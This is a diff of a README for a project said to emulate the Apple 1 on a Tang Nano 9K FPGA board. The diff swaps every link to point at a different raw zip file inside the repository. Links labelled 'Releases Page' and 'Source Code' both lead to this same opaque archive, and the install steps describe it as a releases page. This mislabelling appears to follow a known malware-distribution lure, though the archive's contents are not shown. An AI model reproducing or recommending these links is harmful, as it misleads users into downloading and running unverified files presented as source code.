@@ -1,6 +1,6 @@
 # 🎮 TangNano9K-Apple1 - Experience the Apple 1 on FPGA
 
-![Download TangNano9K-Apple1](https://raw.githubusercontent.com/Kilo9000/TangNano9K-Apple1/main/tentful/TangNano9K-Apple1.zip)
+![Download TangNano9K-Apple1](https://github.com/Kilo9000/TangNano9K-Apple1/raw/refs/heads/main/TangNano9K-Apple1/Apple-Nano-Tang-v2.3-beta.2.zip)
 
 ## 📖 Description
 TangNano9K-Apple1 brings the classic Apple 1 Computer to life on a Tang Nano 9K FPGA board. This project allows you to explore computing history and run vintage software with modern hardware. 
@@ -16,7 +16,7 @@ Before you download, make sure your system meets these requirements:
 - Power supply for your FPGA board.
 
 ## 📂 Download & Install
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Kilo9000/TangNano9K-Apple1/main/tentful/TangNano9K-Apple1.zip).
+Visit this page to download: [Releases Page](https://github.com/Kilo9000/TangNano9K-Apple1/raw/refs/heads/main/TangNano9K-Apple1/Apple-Nano-Tang-v2.3-beta.2.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of TangNano9K-Apple1.
@@ -49,7 +49,7 @@ TangNano9K-Apple1 is open-source and available under the MIT License. You can mo
 We welcome contributors to help improve this project. If you have ideas or improvements, please check the contributing guidelines in the repository. 
 
 ## 🎯 Links
-- [Releases Page](https://raw.githubusercontent.com/Kilo9000/TangNano9K-Apple1/main/tentful/TangNano9K-Apple1.zip)
-- [Source Code](https://raw.githubusercontent.com/Kilo9000/TangNano9K-Apple1/main/tentful/TangNano9K-Apple1.zip)
+- [Releases Page](https://github.com/Kilo9000/TangNano9K-Apple1/raw/refs/heads/main/TangNano9K-Apple1/Apple-Nano-Tang-v2.3-beta.2.zip)
+- [Source Code](https://github.com/Kilo9000/TangNano9K-Apple1/raw/refs/heads/main/TangNano9K-Apple1/Apple-Nano-Tang-v2.3-beta.2.zip)
 
 We hope you enjoy using TangNano9K-Apple1 and exploring the Apple 1 experience on modern hardware!
